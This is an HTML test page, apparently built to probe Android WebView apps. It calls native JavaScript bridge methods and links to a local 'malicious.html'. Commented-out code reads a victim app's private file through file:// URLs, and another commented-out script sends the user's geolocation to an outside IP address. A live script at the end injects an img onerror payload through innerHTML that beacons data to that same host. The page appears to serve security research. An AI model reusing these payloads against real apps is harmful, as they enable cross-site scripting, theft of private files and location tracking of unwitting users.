
<!DOCTYPE html>
<html>
<head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <!--<link href='https://fonts.googleapis.com/css?family=Architects+Daughter' rel='stylesheet' type='text/css'>-->
    <!--<link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css" media="screen">-->
    <!--<link rel="stylesheet" type="text/css" href="stylesheets/pygment_trac.css" media="screen">-->
    <!--<link rel="stylesheet" type="text/css" href="stylesheets/print.css" media="print">-->
    <script type="text/javascript">
        function init() {
            var testVal = document.getElementById('mytextId').value;
            AndroidFunction.showToast(testVal);
        }

        function getGeoLocationFromJava() {
            AndroidFunction.getLocation();
        }


    </script>
    <script type="text/javascript">
        //check if requestFileSystem support or not

        function init_dup() {
            var testVal = document.getElementById('mytextId2').value;
            // AndroidFunction_dup.showToast(testVal);
        }

        function init_dup_wrapper() {
            // init_dup.displayName = "Display:init_dup()";
            // init_dup();
        }

        function goHome() {
            window.WebJSInterface.goToHome();
        }

        function getCGD() {
            window.native.getCaregiverDetails();
        }

        function test() {
            crbsweb.enableDebug();
            crbsweb.showSettings();
        }

    </script>

    <!--[if lt IE 9]>
    <!--<script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>-->
    <![endif]-->

    <title>Monojo.GitHub.io by monojo</title>
</head>

<body>

<a id='hrefLocall' href="file:///sdcard/malicious.html"
   class="button">
    <small>hrefLocal</small>
</a>

<a id='hrefAndroidAsset' href="file:///android_asset/app.html"
   class="button">
    <small>hfreAndroidAsset</small>
</a>
<header>
    <div class="inner">
        <h1>Try</h1>
        <h2></h2>
        <a href="https://github.com/monojo" class="button">
            <small>Follow me on</small>
            GitHub</a>
    </div>
</header>
<div id="content-wrapper">
    <div class="inner clearfix">
        <section id="main-content">
            <h3>
                <div style="float: left;width: 50%;">
                    <input type="text" style="width: 180px;"

                           name="myText" id="mytextId" value="From JAVA1"/>

                </div>
                <div style="clear: both;height: 3px;"></div>
                <div>
                    <input value="submit" type="button" value="test"

                           id="btnSubmit" onclick="javascript:return init();"/>
                </div>
                <div>
                    <input value="gohome" type="button" value="test"

                           id="btnCVSGoHome" onclick="javascript:return goHome();"/>
                </div>
                <div>
                    <input value="CGD" type="button" value="test"

                           id="btnCGD" onclick="javascript:return getCGD();"/>
                </div>
                <div>
                    <input value="test" type="button" value="test"

                           id="test" onclick="javascript:return test();"/>
                </div>
                <div>
                    <input type="file" id="files" name="Myfiles" onchange="handleFiles();"/>
                    <!--<input type="button" id="import" value="导入"/>-->
                </div>

                <a id="welcome-to-github-pages" class="anchor" href="#welcome-to-github-pages"
                   aria-hidden="true"><span
                        class="octicon octicon-link"></span></a>Welcome to GitHub Pages.
            </h3>
            <div style="float: left;width: 50%;">
                <input type="text" style="width: 180px;"

                       name="myText" id="mytextId2" value="From JAVA2"/>

            </div>
            <div style="clear: both;height: 3px;"></div>
            <div>
                <input value="submit" type="button" value="test"

                       id="btnSubmit2" onclick="javascript:return init_dup_wrapper();"/>
            </div>
            <div id="inner">
            </div>
            <div id="inner2"></div>
            <p>This automatic page generator is the easiest way to create beautiful pages for all of
                your projects.
                Author your page content here using GitHub Flavored Markdown, select a template
                crafted by a designer,
                and publish. After your page is generated, you can check out the new branch:</p>
            <p>Click the button to get your coordinates.</p>


            <button onclick="getLocation()">Location</button>
            <p id="demo"></p>
            <a href="fb://webview/?url=http://monojo.github.io">facebook test</a>
            <!--<img id="haha" src='http://www.hyperlinkcode.com/images/sample-image.jpg' }>-->
            <div id="div1"><p> haha</p></div>

            <!--geolocation call-->
            <script>
                //FileReader() test
                // function handleFiles() {
                //     var selectedFile = document.getElementById("files").files[0];//获取读取的File对象
                //     var name = selectedFile.name;//读取选中文件的文件名
                //     var size = selectedFile.size;//读取选中文件的大小
                //     console.log("文件名:" + name + "大小：" + size);
                //
                //     var reader = new FileReader();//这里是核心！！！读取操作就是由它完成的。
                //     reader.readAsText(selectedFile);//读取文件的内容
                //
                //     reader.onload = function () {
                //         console.log(this.result);//当读取完成之后会回调这个函数，然后此时文件的内容存储到了result中。直接操作即可。
                //     };
                // }

                // var time = performance.now();
                // console.log(time);
                // console.log(window.navigator.appCodeName);
                // console.log(window.navigator.appName);
                // var id = document.getElementById('div1');
                // var img = document.createElement('img');
                // img.src = 'http://www.hyperlinkcode.com/images/sample-image.jpg';
                // id.appendChild(img);

                // create a new div element
                // var newDiv = document.createElement("div");
                // // and give it some content
                // var newContent = document.createTextNode("Hi there and greetings!");
                // // add the text node to the newly created div
                // newDiv.appendChild(newContent);
                //
                // // add the newly created element and its content into the DOM
                // var currentDiv = document.getElementById("div1");
                // currentDiv.appendChild(newDiv);
                <!--let batteryIsCharging  = false;-->
                <!--navigator.getBattery().then(function(battery) {-->
                <!--batteryIsCharging = battery.charging;-->
                <!--charTime = battery.charginTime;-->
                <!--battery.addEventListener('charginchange', function() {-->
                <!--batteryIsCharging = battery.charging;-->
                <!--});-->
                <!--});-->
                <!--console.log("battery?" + (batteryIsCharging? "yes"  : "no"));-->
                // console.log("wtf");
                <!--var type = navigator.connection.type;-->

                // // Check for Geolocation API permissions
                navigator.permissions.query({name: 'geolocation'})
                    .then(function (permissionStatus) {
                        console.log('geolocation permission state is ', permissionStatus.state);

                        permissionStatus.onchange = function () {
                            console.log('geolocation permission state has changed to ',
                                this.state);
                        };
                    });

                function getLocation() {
                    if (navigator.geolocation) {
                        console.log("getting position");
                        navigator.geolocation.getCurrentPosition(showPosition, showError);
                    } else {
                        console.log("Geolocation is not supported by this browser.");
                    }
                }

                function showPosition(position) {
                    console.log("showPostion");
                    console.log("Latitude: " + position.coords.latitude +
                        "<br>Longitude: " + position.coords.longitude);
                }

                function showError(error) {
                    console.log("er");
                    switch (error.code) {
                        <!--console.log("error");-->
                        case error.PERMISSION_DENIED:
                            console.log("per");
                            break;
                        case error.POSITION_UNAVAILABLE:
                            console.log("unavail");
                            break;
                        case error.TIMEOUT:
                            console.log("time");
                            break;
                        case error.UNKNOWN_ERROR:
                            console.log("unknow");
                            break;
                    }
                }

            </script>

            <!--<script>-->
            <!--// var div = document.createElement('div');-->
            <!--// // div.innerHTML = "my <b>new</b> skill - <large>DOM maniuplation!</large>";-->
            <!--// // set style-->
            <!--// div.style.color = 'red';-->
            <!--// // better to use CSS though - just set class-->
            <!--// div.setAttribute('class', 'myclass'); // and make sure myclass has some styles in css-->
            <!--// var html = "<script> console.log('ZX:div');<\/script>";-->
            <!--// div.innerHTML = html;-->
            <!--// document.body.appendChild(div);-->
            <!--// document.getElementsByTagName("body").innerHTML = div;-->

            <!--function readfile() {-->
            <!--alert(document.getElementById('iframe').contentDocument.body.firstChild.innerHTML);-->
            <!--console.debug(document.getElementById('iframe').contentDocument.body.firstChild.innerHTML);-->
            <!--}-->

            <!--function handleFiles() {-->
            <!--var selectedFile = document.getElementById("files").files[0];//获取读取的File对象-->
            <!--var name = selectedFile.name;//读取选中文件的文件名-->
            <!--var size = selectedFile.size;//读取选中文件的大小-->
            <!--console.log("文件名:" + name + "大小：" + size);-->

            <!--var reader = new FileReader();//这里是核心！！！读取操作就是由它完成的。-->
            <!--reader.readAsText(selectedFile);//读取文件的内容-->

            <!--reader.onload = function () {-->
            <!--console.log(this.result);//当读取完成之后会回调这个函数，然后此时文件的内容存储到了result中。直接操作即可。-->
            <!--};-->
            <!--}-->
            <!--</script>-->

            <!--<script>-->
            <!--function errorHandler(e) {-->
            <!--var msg = '';-->

            <!--switch (e.code) {-->
            <!--case FileError.QUOTA_EXCEEDED_ERR:-->
            <!--msg = 'QUOTA_EXCEEDED_ERR';-->
            <!--break;-->
            <!--case FileError.NOT_FOUND_ERR:-->
            <!--msg = 'NOT_FOUND_ERR';-->
            <!--break;-->
            <!--case FileError.SECURITY_ERR:-->
            <!--msg = 'SECURITY_ERR';-->
            <!--break;-->
            <!--case FileError.INVALID_MODIFICATION_ERR:-->
            <!--msg = 'INVALID_MODIFICATION_ERR';-->
            <!--break;-->
            <!--case FileError.INVALID_STATE_ERR:-->
            <!--msg = 'INVALID_STATE_ERR';-->
            <!--break;-->
            <!--default:-->
            <!--msg = 'Unknown Error';-->
            <!--break;-->
            <!--}-->
            <!--;-->

            <!--console.log('Error: ' + msg);-->
            <!--}-->

            <!--window.requestFileSystem = window.requestFileSystem || window.webkitRequestFileSystem;-->
            <!--console.log('requestFileSystem', window.requestFileSystem);-->
            <!--window.webkitStorageInfo.requestQuota(PERSISTENT, 1024 * 1024, function (grantedBytes) {-->
            <!--window.webkitRequestFileSystem(PERSISTENT, grantedBytes, onInitFs, errorHandler);-->
            <!--}, function (e) {-->
            <!--console.log('Error', e);-->
            <!--});-->

            <!--function onInitFs(fs) {-->
            <!--// console.log('Opened file system: ' + fs.name);-->
            <!--// window.requestFileSystem(type, size, successCallback, opt_errorCallback)-->
            <!--fs.root.getFile("/data/data/com.example.moslab.webviewvictim/files/abc.txt", {}, function (fileEntry) {-->
            <!--fileEntry.file(function (file) {-->
            <!--var reader = FileReader();-->
            <!--reader.onloadend(function (e) {-->
            <!--var txtArea = document.createElement('textarea');-->
            <!--txtArea.value = this.result;-->
            <!--document.body.appendChild(txtArea);-->
            <!--});-->
            <!--reader.readAsText(file);-->
            <!--}, errorHandler);-->
            <!--// fileEntry.isFile === true-->
            <!--// fileEntry.name == 'log.txt'-->
            <!--// fileEntry.fullPath == '/log.txt'-->

            <!--}, errorHandler);-->
            <!--}-->

            <!--window.requestFileSystem(window.TEMPORARY, 5 * 1024 * 1024 /*5MB*/, onInitFs, errorHandler);-->
            <!--</script>-->

            <!--<iframe src="https://bumoslab.github.io">-->
            <!--<p>Your browser does not support iframes.</p>-->
            <!--</iframe>-->

            <!--<iframe id='iframe' src="file:///data/data/com.example.moslab.webviewvictim/files/abc.txt"-->
            <!--onload='readfile()'></iframe>-->
            <!--<a id='hrefFile' href="file:///data/data/com.example.moslab.webviewvictim/files/abc.txt" onload='readfile()'-->
            <!--class="button">-->
            <!--<small>hrefFile</small>-->
            <!--</a>-->

            <!--<pre><code>$ cd your_repo_root/repo_name-->
            <!--$ git fetch origin-->
            <!--$ git checkout gh-pages-->
            <!--</code></pre>-->
            <!--<div id="http_img"></div>-->
            <!--<script>-->
            <!--function loc() {-->
            <!--b = document.createElement('img');-->
            <!--m = "abc";-->
            <!--console.log("ZX:" + m);-->
            <!--b.src = "http://23.83.235.55:8081/" + m;-->
            <!--}-->
            <!--</script>-->
            <!--<img src=x onerror=loc()>-->
            <!--<script>-->
            <!--function loc2(){-->
            <!--var b=document.createElement('img');-->
            <!--var m="abc";-->
            <!--console.log("ZX:"+m);-->
            <!--b.src='http://23.83.235.55:8081/'+m;-->
            <!--// b.src='http://www.hyperlinkcode.com/images/sample-image.jpg';-->
            <!--var id = document.getElementById("http_img");-->
            <!--// id.appendChild(b);-->
            <!--}-->
            <!--</script>-->
            <!--<img src=x onerror=loc2()>-->
            <!--<img src="http://23.83.235.55:8081/images2.jpg">-->
            <script>
                document.writeln("from writeln");
                // get high accuracy timer
                if (window.performance.now) {
                    console.log("Using high performance timer");
                    getTimestamp = function() { return window.performance.now(); };
                } else {
                    if (window.performance.webkitNow) {
                        console.log("Using webkit high performance timer");
                        getTimestamp = function() { return window.performance.webkitNow(); };
                    } else {
                        console.log("Using low performance timer");
                        getTimestamp = function() { return new Date().getTime(); };
                    }
                }

                // var t1 = getTimestamp();
                // var i;
                // // ZX call geolocation
                // // getLocation();
                // // getLocation();
                // // getLocation();
                // // getLocation();
                // // getLocation();
                // // getLocation();
                // // getLocation();
                // // getLocation();
                // // getLocation();
                // // getLocation();
                // var t2 = getTimestamp();
                // console.log("zxRes time: " + (t2 - t1));
            </script>

        </section>

        <!--&lt;!&ndash;<aside id="sidebar">&ndash;&gt;-->
        <!--&lt;!&ndash;<p>This page was generated by <a href="https://pages.github.com">GitHub Pages</a> using the Architect theme&ndash;&gt;-->
        <!--&lt;!&ndash;by <a href="https://twitter.com/jasonlong">Jason Long</a>.</p>&ndash;&gt;-->
        <!--</aside>-->
    </div>
</div>


<!--<script>-->
<!--// var str = "<div></div>";-->
<!--var str = "<script> navigator.geolocation.getCurrentPosition(getposition, handleError);" +-->
    <!--"function getposition(position) { b=document.createElement(\'img\'); b.src=\"http://23.83.235.55:8081/\" + position.coords.latitude;}" +-->
    <!--"function handleError(error) { };<\/script>";-->

<!--// var str = "<script> console.log(\"ZX: from console\");<\/script>";-->
<!--document.getElementById('inner').innerHTML = str;-->
<!--// document.write(str);-->
<!--</script>-->

<script>
// var str = "<div></div>";
var str = "<img src=x onerror=console.log('injecting');b=document.createElement(\"img\");m=\"abc\";"
+ "console.log(\"ZX\"+m);b.src=\"http://23.83.235.55:8081/\"+m;'>";
document.getElementById('inner').innerHTML = str;
</script>
<!--<script>-->
<!--// var str = "<div></div>";-->
<!--var str = "<img src=xx onerror='b=document.createElement(\"img\");b.src=\"http://23.83.235.55:8081/def\";'>";-->
<!--document.getElementById('inner2').innerHTML = str;-->
<!--</script>-->

</body>
</html>